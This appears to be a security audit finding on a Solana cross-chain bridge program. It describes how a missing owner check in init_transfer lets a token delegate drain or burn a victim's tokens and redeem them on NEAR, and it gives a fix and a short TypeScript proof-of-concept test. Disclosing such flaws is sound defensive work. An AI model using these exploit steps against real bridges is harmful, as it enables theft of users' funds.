### Title
Delegated Token Account Drain via Missing `from` Owner Constraint in `InitTransfer` — (`solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs`)

---

### Summary

The `InitTransfer` account struct constrains `from` only by mint and token program, but never asserts `from.owner == user`. The SPL Token program accepts a delegate as a valid authority for `transfer_checked` and `burn`. An attacker who holds a delegation over a victim's token account can call `init_transfer` with `from = victim's account` and `user = attacker`, draining the victim's tokens into the vault or burning them, while posting a Wormhole VAA naming the attacker as sender and directing the cross-chain payout to an attacker-controlled NEAR address.

---

### Finding Description

The `from` account in the `InitTransfer` struct is declared as:

```rust
#[account(
    mut,
    token::mint = mint,
    token::token_program = token_program,
)]
pub from: Box<InterfaceAccount<'info, TokenAccount>>,
``` [1](#0-0) 

There is no `token::authority = user` constraint. The only signer requirement is that `user` signs the transaction:

```rust
#[account(mut, owner = common.system_program.key())]
pub user: Signer<'info>,
``` [2](#0-1) 

In `process`, the native-token path calls `transfer_checked` passing `user` as the authority:

```rust
TransferChecked {
    from: self.from.to_account_info(),
    to: vault.to_account_info(),
    authority: self.user.to_account_info(),
    mint: self.mint.to_account_info(),
},
``` [3](#0-2) 

And the bridged-token path calls `burn` with the same authority:

```rust
Burn {
    mint: self.mint.to_account_info(),
    from: self.from.to_account_info(),
    authority: self.user.to_account_info(),
},
``` [4](#0-3) 

The SPL Token program's `transfer_checked` and `burn` instructions accept **either the account owner or an approved delegate** as a valid authority. There is no additional ownership check anywhere in `process`. The Wormhole message is then posted with `self.user.key()` as the sender:

```rust
self.common.post_message(payload.serialize_for_near((
    self.common.sequence.sequence,
    self.user.key(),   // attacker's pubkey becomes the "sender"
    self.mint.key(),
))?)?;
``` [5](#0-4) 

---

### Impact Explanation

An attacker who obtains any delegation over a victim's token account (even a minimal one via `spl-token approve`) can:

1. Call `init_transfer` with `from = victim's token account`, `user = attacker (signer)`, and an attacker-controlled NEAR `recipient` in the payload.
2. The Anchor constraint layer passes (mint and token_program match).
3. The SPL Token CPI succeeds because the attacker is a valid delegate.
4. Victim's tokens are locked in the vault (native) or burned (bridged).
5. A Wormhole VAA is emitted naming the attacker as sender with the attacker's NEAR address as recipient.
6. The attacker redeems the full amount on NEAR.

This is a direct theft of victim SPL tokens via the bridge, matching the Critical scope: *stealing or loss of bridged funds*.

---

### Likelihood Explanation

Delegations are a standard SPL Token feature used by DEXes, lending protocols, and wallets. A victim who has previously approved any program or address (including the attacker) for their token account is immediately exploitable. The attacker needs no privileged access beyond a valid delegation, which can be obtained through social engineering, a malicious dApp approval, or by exploiting another protocol that issues approvals.

---

### Recommendation

Add an explicit owner constraint to the `from` account in the `InitTransfer` struct:

```rust
#[account(
    mut,
    token::mint = mint,
    token::token_program = token_program,
    token::authority = user,   // <-- add this
)]
pub from: Box<InterfaceAccount<'info, TokenAccount>>,
```

This ensures Anchor rejects any `from` account whose owner is not the signing `user`, closing the delegation drain path entirely.

---

### Proof of Concept

```typescript
// Bankrun/Anchor test sketch
it("delegate drain", async () => {
  // 1. Victim creates and funds a token account
  const victimTokenAccount = await createTokenAccount(victim.publicKey, mint);
  await mintTo(victimTokenAccount, 1_000_000);

  // 2. Victim approves attacker as delegate for the full amount
  await approve(victimTokenAccount, attacker.publicKey, victim, 1_000_000);

  // 3. Attacker calls init_transfer with from = victim's account, user = attacker
  await program.methods
    .initTransfer({ amount: 1_000_000n, fee: 0n, nativeFee: 0,
                    recipient: "attacker.near", message: "" })
    .accounts({
      from: victimTokenAccount,   // victim's account
      user: attacker.publicKey,   // attacker signs
      mint,
      vault: vaultPDA,
      // ...
    })
    .signers([attacker])
    .rpc();

  // 4. Assert victim's balance is now 0
  const balance = await getTokenBalance(victimTokenAccount);
  assert.equal(balance, 0); // victim drained

  // 5. Wormhole VAA encodes attacker.near as recipient — attacker redeems on NEAR
});
```

### Citations

**File:** solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs (L34-39)
```rust
    #[account(
        mut,
        token::mint = mint,
        token::token_program = token_program,
    )]
    pub from: Box<InterfaceAccount<'info, TokenAccount>>,
```

**File:** solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs (L60-64)
```rust
    #[account(
        mut,
        owner = common.system_program.key(),
    )]
    pub user: Signer<'info>,
```

**File:** solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs (L93-98)
```rust
                    TransferChecked {
                        from: self.from.to_account_info(),
                        to: vault.to_account_info(),
                        authority: self.user.to_account_info(),
                        mint: self.mint.to_account_info(),
                    },
```

**File:** solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs (L113-117)
```rust
                    Burn {
                        mint: self.mint.to_account_info(),
                        from: self.from.to_account_info(),
                        authority: self.user.to_account_info(),
                    },
```

**File:** solana/programs/bridge_token_factory/src/instructions/user/init_transfer.rs (L123-127)
```rust
        self.common.post_message(payload.serialize_for_near((
            self.common.sequence.sequence,
            self.user.key(),
            self.mint.key(),
        ))?)?;
```
